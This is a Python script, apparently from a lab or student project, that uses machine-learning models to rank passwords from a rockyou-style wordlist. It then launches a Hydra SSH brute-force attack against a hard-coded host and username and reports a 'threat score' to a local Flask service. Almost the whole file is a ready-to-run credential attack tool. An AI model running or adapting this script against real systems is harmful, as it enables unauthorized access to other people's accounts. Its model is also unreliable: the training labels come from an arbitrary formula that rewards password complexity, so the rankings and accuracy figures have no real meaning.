#!/usr/bin/env python3

import re
import subprocess
import sys
import numpy as np
import pandas as pd
import requests
from sklearn.ensemble import RandomForestRegressor, GradientBoostingRegressor
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score, confusion_matrix
from sklearn.preprocessing import StandardScaler

TARGET_IP = "192.168.64.3"
USERNAME = "ubuntu"
PASSWORD_FILE = "passwords.txt"
COMMON_PASSWORDS_FILE = "rockyou_2025_00.txt"

RF_ESTIMATORS = 30
GB_ESTIMATORS = 30


def send_threat_score_to_flask(threat_score, extra_data=None):
    payload = {
        "threat_score": threat_score,
        "source": "ssh-ml-bruteforce",
        "details": extra_data if extra_data else {}
    }
    try:
        response = requests.post("http://localhost:5000/api/threat_score", json=payload)
        print(f"[+] Threat score sent: {response.status_code}")
    except Exception as e:
        print(f"[!] Failed to send threat score: {e}")


def load_common_passwords(file_path):
    encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']
    for encoding in encodings:
        try:
            with open(file_path, 'r', encoding=encoding) as file:
                return [line.strip() for line in file if line.strip()]
        except:
            continue
    print("[!] Failed to load password file")
    sys.exit(1)


def extract_password_features(password):
    features = {}

    features['length'] = len(password)
    features['digits_count'] = sum(c.isdigit() for c in password)
    features['upper_count'] = sum(c.isupper() for c in password)
    features['lower_count'] = sum(c.islower() for c in password)
    features['special_count'] = sum(c in "!@#$%^&*()-_+=[]{}|;:,.<>?/" for c in password)

    features['has_upper'] = int(any(c.isupper() for c in password))
    features['has_lower'] = int(any(c.islower() for c in password))
    features['has_digit'] = int(any(c.isdigit() for c in password))
    features['has_special'] = int(any(c in "!@#$%^&*()-_+=[]{}|;:,.<>?/" for c in password))

    features['has_mixed_case'] = int(features['has_upper'] and features['has_lower'])

    features['contains_admin'] = int("admin" in password.lower())
    features['contains_pass'] = int("pass" in password.lower())
    features['contains_user'] = int("user" in password.lower())
    features['contains_test'] = int("test" in password.lower())
    features['contains_root'] = int("root" in password.lower())

    features['contains_year'] = int(bool(re.search(r'(19|20)\d{2}', password)))
    features['contains_seq'] = int(bool(re.search(r'(\d)\1{2,}', password)))

    unique_chars = len(set(password))
    features['char_diversity'] = unique_chars / max(len(password), 1)

    return features


def train_password_model():
    print("[*] Training ML model...")

    sample_size = min(300, len(COMMON_PASSWORDS))
    sampled_passwords = list(np.random.choice(COMMON_PASSWORDS, size=sample_size, replace=False))

    data = []
    for pwd in sampled_passwords:
        features = extract_password_features(pwd)

        label_raw = (
            0.4 * features['has_lower'] +
            0.2 * features['has_digit'] +
            0.2 * features['has_special'] +
            0.2 * features['has_upper']
        )

        label_raw = np.clip(label_raw + np.random.uniform(-0.1, 0.1), 0, 1)
        label_bin = 1 if label_raw > 0.5 else 0

        data.append({**features, 'label_raw': label_raw, 'label_bin': label_bin})

    df = pd.DataFrame(data)

    X = df.drop(columns=['label_raw', 'label_bin'])
    y_reg = df['label_raw']
    y_clf = df['label_bin']

    scaler = StandardScaler()
    X_scaled = scaler.fit_transform(X)

    X_train, X_test, y_train_reg, y_test_reg, y_train_clf, y_test_clf = train_test_split(
        X_scaled, y_reg, y_clf, test_size=0.2, random_state=42)

    rf = RandomForestRegressor(n_estimators=RF_ESTIMATORS, max_depth=8)
    gb = GradientBoostingRegressor(n_estimators=GB_ESTIMATORS, max_depth=4)

    rf.fit(X_train, y_train_reg)
    gb.fit(X_train, y_train_reg)

    preds = 0.6 * rf.predict(X_test) + 0.4 * gb.predict(X_test)
    preds_bin = (preds >= 0.5).astype(int)

    print("\nMODEL METRICS")
    print("Accuracy:", accuracy_score(y_test_clf, preds_bin))
    print("Precision:", precision_score(y_test_clf, preds_bin, zero_division=0))
    print("Recall:", recall_score(y_test_clf, preds_bin, zero_division=0))
    print("F1:", f1_score(y_test_clf, preds_bin, zero_division=0))

    return rf, gb, scaler, X.columns


def predict_passwords(rf, gb, scaler, columns, passwords):
    feats = [extract_password_features(pw) for pw in passwords]
    X = pd.DataFrame(feats, columns=columns)
    X_scaled = scaler.transform(X)

    preds = 0.6 * rf.predict(X_scaled) + 0.4 * gb.predict(X_scaled)

    return sorted(zip(passwords, preds), key=lambda x: x[1], reverse=True)


class MLSSHAttacker:
    def __init__(self):
        self.rf, self.gb, self.scaler, self.columns = train_password_model()
        with open(PASSWORD_FILE) as f:
            self.passwords = [line.strip() for line in f if line.strip()]

    def analyze(self):
        return predict_passwords(self.rf, self.gb, self.scaler, self.columns, self.passwords)

    def launch_hydra_attack(self, ranked_passwords, top_n=10):
        top_passwords = [pw for pw, _ in ranked_passwords[:top_n]]

        temp_file = "/tmp/ml_pw.txt"
        with open(temp_file, "w") as f:
            f.write("\n".join(top_passwords))

        print("\n[*] Running Hydra...")

        cmd = [
            "hydra",
            "-l", USERNAME,
            "-P", temp_file,
            f"ssh://{TARGET_IP}",
            "-t", "1"
        ]

        subprocess.run(cmd)


def main():
    global COMMON_PASSWORDS
    COMMON_PASSWORDS = load_common_passwords(COMMON_PASSWORDS_FILE)

    attacker = MLSSHAttacker()
    ranked = attacker.analyze()

    print("\nTop 10 Password Predictions:\n")

    for i, (pw, score) in enumerate(ranked[:10], 1):
        print(f"{i}. {pw} -> {int(score*100)}%")

    threat_score = int(ranked[0][1] * 100) if ranked else 0

    send_threat_score_to_flask(threat_score, {
        "top": ranked[:5]
    })

    attacker.launch_hydra_attack(ranked)


if __name__ == "__main__":
    main()